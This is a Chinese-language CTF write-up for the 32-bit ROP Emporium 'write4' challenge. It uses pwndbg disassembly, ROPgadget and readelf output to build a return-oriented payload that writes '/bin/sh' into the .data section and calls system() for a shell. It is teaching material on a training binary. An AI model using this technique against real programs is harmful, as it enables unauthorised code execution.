## Reverse
和 1-split 差不多，只是这次没有 `usefulString` 了，我们得透过 ROP Chain 把 `/bin/sh` 这个字串写入内存某处并调用 system()。

我想到的解题思路有两种：
1. 字串写在 stack
2. 字串写在任何一个 writable section

由于 ASLR 开启 stack 位址必定是随机化的，所以第一种方法在实务上比较行不通，因此我们选择第二种。

<br>

bof 的注入点和前几题一样，都是在 pwnme() 里面调用 gets() 的地方。我们就不再看它了，直接逆向 usefulFunction()。
```
pwndbg> disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0804864c <+0>:     push   ebp
   0x0804864d <+1>:     mov    ebp,esp
   0x0804864f <+3>:     sub    esp,0x8
   0x08048652 <+6>:     sub    esp,0xc
   0x08048655 <+9>:     push   0x8048754  <--- "/bin/ls"
   0x0804865a <+14>:    call   0x8048430 <system@plt>
   0x0804865f <+19>:    add    esp,0x10
   0x08048662 <+22>:    nop
   0x08048663 <+23>:    leave
   0x08048664 <+24>:    ret
```

如果要直接 ret to system()，我们一定需要一个 `/bin/sh` 的字串是吧？ 所以在 ret to system() 前得先 ret 到其他地方做字串。

## ROP Gadgets
那么要 ret 到哪里呢？我们接着逆向 usefulGadgets()，可以找到一个有用的 gadget。
```
pwndbg> disas usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x08048670 <+0>:     mov    DWORD PTR [edi],ebp  <--- gadget 1
   0x08048672 <+2>:     ret                         <--- gadget 1
   0x08048673 <+3>:     xchg   ax,ax
   0x08048675 <+5>:     xchg   ax,ax
   0x08048677 <+7>:     xchg   ax,ax
   0x08048679 <+9>:     xchg   ax,ax
   0x0804867b <+11>:    xchg   ax,ax
   0x0804867d <+13>:    xchg   ax,ax
   0x0804867f <+15>:    nop
```

我们可以把 ebp 的内容，复制到 edi 所指向的内存中（复制 4 bytes）。但这样不够，我们再接着看看 `ROPGadget --binary write432`，其中：
```
0x080486da : pop edi ; pop ebp ; ret  <--- gadget 2
```

这个 gadget 可以从 stack 上把东西 pop 到 edi 和 ebp，然后就会立刻 ret。

<br>

## Pwn
先设计下 payload：
```
11 * 'AAAA' +
gadget2     + buf       + '/bin'    + gadget1 +
gadget2     + (buf + 4) + '/sh\x00' + gadget1 +
system_plt  + 'AAAA'    + buf
```

针对上面逐行解释：
1. padding
2. ret 到 gadget2，然后从 stack 上 pop 两个东西分别到 edi, ebp，紧接着 ret 到 gadget1 写入 "/bin" 到 [edi]... (edi = buf)
3. ret 到 gadget2，然后从 stack 上 pop 两个东西分别到 edi, ebp，紧接着 ret 到 gadget1 写入 “/sh\x00” 到 [edi]... (edi = buf+4)
4. ret 到 system@plt，system() 的返回位址为 AAAA（没差），参数为 buf 字串。

那么重点是，我们要把 "/bin/sh" 写到哪里呢？在 ASLR 开启的时候 stack 位址是随机化的，所以我们接着：
```
$ readelf -S write432

There are 31 section headers, starting at offset 0x196c:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000030 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481dc 0001dc 0000d0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          080482ac 0002ac 000081 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          0804832e 00032e 00001a 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         08048348 000348 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             08048368 000368 000020 08   A  5   0  4
  [10] .rel.plt          REL             08048388 000388 000038 08  AI  5  24  4
  [11] .init             PROGBITS        080483c0 0003c0 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080483f0 0003f0 000080 04  AX  0   0 16
  [13] .plt.got          PROGBITS        08048470 000470 000008 00  AX  0   0  8
  [14] .text             PROGBITS        08048480 000480 000262 00  AX  0   0 16
  [15] .fini             PROGBITS        080486e4 0006e4 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        080486f8 0006f8 000064 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        0804875c 00075c 00003c 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048798 000798 00010c 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [24] .got.plt          PROGBITS        0804a000 001000 000028 04  WA  0   0  4
  [25] .data             PROGBITS        0804a028 001028 000008 00  WA  0   0  4
  [26] .bss              NOBITS          0804a040 001030 00002c 00  WA  0   0 32
  [27] .comment          PROGBITS        00000000 001030 000034 01  MS  0   0  1
  [28] .shstrtab         STRTAB          00000000 001861 00010a 00      0   0  1
  [29] .symtab           SYMTAB          00000000 001064 000510 10     30  50  4
  [30] .strtab           STRTAB          00000000 001574 0002ed 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
```

我们就写入 .data 吧，直接写入最前面就好，因此 buf = 0x0804a028。利用脚本请参看 exploit.py
